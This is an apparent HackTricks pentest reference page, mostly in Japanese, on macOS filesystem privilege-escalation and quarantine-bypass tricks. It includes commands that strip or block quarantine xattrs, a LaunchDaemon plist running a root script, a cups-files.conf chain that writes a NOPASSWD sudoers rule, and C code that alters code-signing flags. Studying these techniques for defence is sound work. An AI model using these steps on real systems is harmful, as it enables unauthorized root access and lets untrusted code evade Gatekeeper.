# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

**directory** では、3つの permission bit は通常の file の場合とは異なる意味を持ちます。`chmod(1)` は、directory に適用された execute bit を "**search**" と呼びます:<sup>[[2]](#references)</sup>

> `0100` For files, allow execution by owner. For directories, allow the owner to **search** in the directory.

- **read** - directory entries を **enumerate**（名前を一覧表示）できます。
- **write** - directory 内の entries を **create、rename、delete** できます。これは *含んでいる* directory の属性であり、file の属性ではない点に注意してください。親 directory に write できる限り、read や write ができない file でも delete できます。
- **subdirectory** を delete するには空でなければならず、そのためには内部にあるすべてのものを削除するための十分な権限が必要です。
- directory に **sticky bit**（`S_ISVTX`、`/tmp` など）が設定されている場合、これは制限されます — POSIX では、プロセスは file の所有者、directory の所有者、または適切な privileges を持つ場合にのみ、その中の files を remove または rename できると規定されています。<sup>[[1]](#references)</sup>
- **execute / search** - directory を **traverse** することが **許可** されます。Pathname resolution は各 component を「その predecessor によって指定された directory 内」で locate するため、path prefix のいずれか1つの component で **search rights** を失うと、leaf file 自体が world-readable であっても、その下にあるすべてのものが path によって到達不能になります。<sup>[[1]](#references)</sup>

### Dangerous Combinations

**root が所有する file/folder を overwrite する方法**:

- path 内の親 **directory owner** の1つが user である
- path 内の親 **directory owner** の1つが **write access** を持つ **users group** である
- users **group** が **file** への **write** access を持っている

上記のいずれかの組み合わせにより、attacker は想定された path に **sym/hard link** を **inject** し、privileged な arbitrary write を取得できます。

### Folder root R+X special case

これは、上記の pathname-resolution rule からそのまま導かれます。directory が **root に対してのみ R+X** を許可している場合、内部の files は他のすべてのユーザーから *path によって* 到達不能になります — ただし、**files 自身の permission bits は permissive なままの場合があります**。妨げとなっているのは directory だけです。

そのため、file をその directory の **外へ移動** させられる primitive — attacker が選択した path を、自分が traverse できる location へ privileged process が **moves/renames/copies** するもの — は、file 自身の mode を破る必要なく arbitrary read へと変わります:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
権限の低いユーザーからソースパスを受け取る、特権ファイル移動機能（installer、log rotator、crash/diagnostic collector、backup、「export」機能）を探します。

## Symbolic Link / Hard Link

### Permissive file/folder

特権プロセスが、**権限の低いユーザー**によって**制御可能**な、または権限の低いユーザーによって**事前に作成可能**な**file**にデータを書き込んでいる場合。そのユーザーは、Symbolic Link または Hard Link を使って**別のファイルを指すように設定**でき、特権プロセスはそのファイルに書き込みます。

攻撃者が**任意の書き込みを悪用して権限昇格できる**箇所については、他のセクションも確認してください。

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) によれば、*"`O_NOFOLLOW` が mask で使用され、`open()` に渡された target file が symbolic link の場合、`open()` は失敗する。" * 最終コンポーネントのみがチェックされ、**中間**コンポーネントは引き続き解決され、追従されます。そのため、`O_NOFOLLOW` で書き込みを「保護」した開発者であっても、target path の**親ディレクトリ**のいずれかに symlink を配置することで攻撃される可能性があります。<sup>[[3]](#references)</sup>

同じ man page には、この問題を実際に解消する flags が記載されています。<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *「... `open()` に渡された path のいずれかのコンポーネントが symbolic link の場合、`open()` は失敗する。」*
- **`O_RESOLVE_BENEATH`** — *「... 指定された path の解決が fd に関連付けられた directory の外に出る場合、`openat()` は失敗する。」*

それ以外では、すでに検証済みの directory FD を基準にした `openat()`、または `realpath()` と再検証が、パスの途中での symlink swap を防ぐために残された方法です。

## .fileloc

`.fileloc` 拡張子を持つファイルは、他のアプリケーションや binary を指すことができます。そのため、これらを開くと、そのアプリケーションまたは binary が実行されます。\
例:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## ファイルディスクリプタ

### Leak FD（`O_CLOEXEC` なし）

`open` の呼び出しに `O_CLOEXEC` フラグがない場合、ファイルディスクリプタは子プロセスに継承されます。したがって、特権プロセスが特権ファイルを開いた後、攻撃者が制御するプロセスを実行すると、攻撃者は **特権ファイルへの FD を継承** できます。

代表的な例は **OS X 10.10 の `DYLD_PRINT_TO_FILE` LPE** です（[SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` は、**restricted（suid root）バイナリ** 内でも `DYLD_PRINT_TO_FILE=/path` を受け入れていました。この変数は `processDyldEnvironmentVariable()` の外部で解析されていたためです。
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` を実行するため、**任意のパスに root 所有のファイルを作成** できました。
- FD は **決して閉じられず、close-on-exec フラグもありませんでした**。そのため、suid バイナリのすべての子プロセスが、**root 所有ファイルへの書き込み可能な FD** を継承しました。
- 例えば `DYLD_PRINT_TO_FILE=/etc/target suid_binary` を実行し、子プロセスで継承された FD 番号を読み取ることで、root 所有ファイルに任意の書き込みが可能でした。さらに `fcntl(fd, F_SETFL, 0)` によって `O_APPEND` を解除し、追記ではなく上書きすることもできました。

同じ構造は、特権プロセスが、あなたが制御するものを `exec` する **前に** ファイルを開く場合にも現れます（helper tools、`$EDITOR` 経由で呼び出される `crontab` 形式のエディタ、環境変数のパスから開かれるログ／デバッグファイルなど）。継承した FD を次のコマンドで列挙できます:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2` を超える値で、自分自身では開けないファイルを指しているものは、arbitrary-write（または arbitrary-read）primitive です。

## quarantine xattrs tricks を回避する

### 削除する
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

ファイル／フォルダにこの不変属性が設定されている場合、そこに xattr を付加することはできません。
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattrをサポートしないファイルシステム

macOSがマウントできるすべてのファイルシステムが、**extended attributes**をネイティブに保存できるわけではありません。HFS+とAPFSは対応していますが、**FAT32、exFAT、および（ほとんどの）NFSマウントは対応していません**。macOSは、`._<filename>`という名前の**AppleDouble**サイドファイルを書き込むことで、これらをエミュレートします（[The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)）。<sup>[[5]](#references)</sup>

これはquarantineに関係します。xattrは、同じボリュームから実際に書き込み、**読み戻す**ことができる場合にのみ保持されるためです。
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
ボリュームが後で `._` companion を無視するパスから読み取られる場合（または companion が除去・削除された場合）、ファイルは **quarantine flag なし** で到着します — そして quarantine されていない `.app` であれば、[macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) で説明されているとおり、App Sandbox を脱出するには十分です。

### writeextattr ACL

この ACL は、ファイルへの `xattrs` の追加を防ぎます
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble**ファイル形式は、ACEを含むファイルをコピーします。

[**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)では、**`com.apple.acl.text`**というxattr内に保存されたACLのテキスト表現が、展開されたファイルのACLとして設定されることを確認できます。そのため、他のxattrが書き込まれるのを防ぐACLを付けた**AppleDouble**ファイル形式でアプリケーションをzipファイルに圧縮すると、展開されたアプリケーションにはquarantine xattrが設定されませんでした。

詳細については[**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)を確認してください。<sup>[[6]](#references)</sup>

これを再現するには、まず正しいACL文字列を取得する必要があります：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
（これが機能する場合でも、sandbox は先に quarantine xattr を書き込むことに注意）

実際には必要ありませんが、念のため残しておきます。


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## 署名チェックの Bypass

### platform binaries チェックの Bypass

一部のセキュリティチェックでは、XPC service への接続を許可するなどの目的で、バイナリが **platform binary** かどうかを確認します。しかし、https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ の bypass で示されているように、platform binary（/bin/ls など）を取得し、環境変数 `DYLD_INSERT_LIBRARIES` を使用して dyld 経由で exploit を注入することで、このチェックを bypass できます。<sup>[[7]](#references)</sup>

### `CS_REQUIRE_LV` および `CS_FORCED_LV` フラグの Bypass

実行中のバイナリは、次のようなコードによって自身のフラグを変更し、チェックを bypass できます。<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code SignaturesのBypass

Bundleには**`_CodeSignature/CodeResources`**ファイルが含まれており、**bundle**内のすべての**file**の**hash**が格納されています。なお、CodeResourcesのhashも**executable**に**embedded**されているため、これも改変できません。

ただし、signatureがチェックされないfileもいくつかあります。これらはplist内の`omit`というkeyで指定されています。例:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
以下を使うと、CLIからリソースの署名を計算できます：
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmgのマウント

ユーザーは、既存のフォルダの一部にカスタム作成したdmgをマウントすることもできます。以下は、カスタムコンテンツを含むカスタムdmgパッケージを作成する方法です:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
通常、macOS は `/usr/libexec/diskarbitrationd` が提供する `com.apple.DiskArbitrarion.diskarbitrariond` Mach service と通信してディスクをマウントします。LaunchDaemons の plist ファイルにパラメータ `-d` を追加して再起動すると、ログが `/var/log/diskarbitrationd.log` に保存されます。\
ただし、`hdik` や `hdiutil` などのツールを使用して、`com.apple.driver.DiskImages` kext と直接通信することも可能です。

## Arbitrary Writes

### Periodic sh scripts

スクリプトが **shell script** として解釈される場合、毎日実行される **`/etc/periodic/daily/999.local`** shell script を上書きできます。

次のコマンドで、このスクリプトの実行を **fake** できます: **`sudo periodic daily`**

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** のような任意の **LaunchDaemon** を、次のように任意のスクリプトを実行する plist として書き込みます:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
`/Applications/Scripts/privesc.sh` を作成し、root として実行したい **commands** を記述します。

### Sudoers File

**arbitrary write** が可能な場合、**sudo** 権限を自分に付与するファイルを **`/etc/sudoers.d/`** フォルダ内に作成できます。

### PATH files

**`/etc/paths`** は、PATH env variable に値を追加する主要な場所の1つです。これを上書きするには root 権限が必要ですが、**privileged process** の script が **full path なしで command** を実行している場合、このファイルを変更して **hijack** できる可能性があります。

**`/etc/paths.d`** にファイルを書き込んで、PATH env variable に新しいフォルダを読み込ませることもできます。

### cups-files.conf

この technique は[こちらの writeup](https://www.kandji.io/blog/macos-audit-story-part1)で使用されています。<sup>[[8]](#references)</sup>

次の内容で `/etc/cups/cups-files.conf` ファイルを作成します:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
これにより、パーミッションが 777 のファイル `/etc/sudoers.d/lpe` が作成されます。末尾にある余分なジャンクは、エラーログの作成をトリガーするためのものです。

次に、権限を escalate するために必要な設定（`%staff ALL=(ALL) NOPASSWD:ALL` など）を `/etc/sudoers.d/lpe` に書き込みます。

その後、`LogFilePerm 700` を指定するように `/etc/cups/cups-files.conf` を再度変更し、`cupsctl` を呼び出して新しい sudoers ファイルを有効にします。

### Sandbox Escape

FS arbitrary write により macOS sandbox から escape することが可能です。いくつかの例についてはページ [macOS Auto Start](../../../../macos-auto-start-locations.md) を確認してください。一般的な方法の 1 つは、起動時に command を実行する Terminal preferences ファイルを `~/Library/Preferences/com.apple.Terminal.plist` に書き込み、`open` を使って呼び出すことです。

## 他のユーザーとして writable files を生成する

非常に一般的な privesc primitive は、**自分が control している directory に privileged process に file を作成させ、その file への write access を維持すること**です。これには 2 つの要素が必要です。

1. 自分が所有する directory（または **inheritable ACL** を設定できる directory）。これにより、その中で作成されるすべてのものが自分の permissions を継承します。
2. file の作成場所を指定できる privileged/`suid` process（通常は debug/logging environment variable、config file、または helper の XPC API を通じて指定します）。

作成された file が別のユーザーによって所有されているにもかかわらず、自分が writable になるのは、**inheritable ACL** の仕組みによるものです。`file_inherit` / `directory_inherit` inheritance flags については [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) に記載されています。<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
現在、特権プロセスが `$DIRNAME` 内に作成するファイルはすべて、**あなたが書き込み可能**です。そのディレクトリが、後で **root として実行される**場所（`/etc/periodic/*`、`/etc/cron.d`、`/etc/sudoers.d`、LaunchDaemon のディレクトリなど）でもある場合、これは直接的な root escalation につながります。ファイルを取得した後に何を書き込むかについては、上記の [Sudoers File](#sudoers-file) および [cups-files.conf](#cups-filesconf) セクションを参照してください。

「env variable によって root プロセスがファイルを作成し、その FD があなたに leak する」チェーンの完全な実例については、上記の [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) を参照してください。

## POSIX Shared Memory

**POSIX shared memory** により、POSIX 準拠の operating system 上のプロセスは共通のメモリ領域にアクセスでき、他の inter-process communication 方法と比べて高速な通信が可能になります。これは、`shm_open()` で shared memory object を作成または開き、`ftruncate()` でサイズを設定し、`mmap()` を使用してプロセスのアドレス空間にマッピングすることで実現します。プロセスは、このメモリ領域を直接読み書きできます。同時アクセスを管理し、データ破損を防ぐために、mutex や semaphore などの synchronization mechanism がよく使用されます。最後に、プロセスは `munmap()` と `close()` で shared memory のマッピングを解除して閉じ、必要に応じて `shm_unlink()` で memory object を削除します。この仕組みは、複数のプロセスが共有データに高速かつ効率的にアクセスする必要がある環境で、効率的な高速 IPC を実現するのに特に有効です。

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>コンシューマーコードの例</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** は、ユーザーアプリケーションにおける **file descriptor operations** の安全性と信頼性を高めるために macOS に導入されたセキュリティ機能です。これらの guarded descriptors により、file descriptor に特定の制限、すなわち「guards」を関連付けることができ、それらは kernel によって強制されます。

この機能は、**unauthorized file access** や **race conditions** など、特定の種類のセキュリティ脆弱性を防ぐのに特に有用です。これらの脆弱性は、例えばある thread が file description にアクセスし、**another vulnerable thread access over it** を許してしまう場合や、file descriptor が脆弱な child process に **inherited** される場合に発生します。この機能に関連する関数には、次のようなものがあります。

- `guarded_open_np`: guard 付きで FD を開く
- `guarded_close_np`: 閉じる
- `change_fdguard_np`: descriptor の guard flags を変更する（guard protection の削除も可能）

## References

- [1] [POSIX.1-2024 — 基本定義、第4章（File Access Permissions、Directory Protection、Pathname Resolution）](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - どの file systems と cloud services が extended attributes を保持するのか？](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper の Achilles heel：macOS の脆弱性を発掘](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - macOS Sandbox Escapes の新時代](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Apple の脆弱性を解明：diskarbitrationd と storagekitd の Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
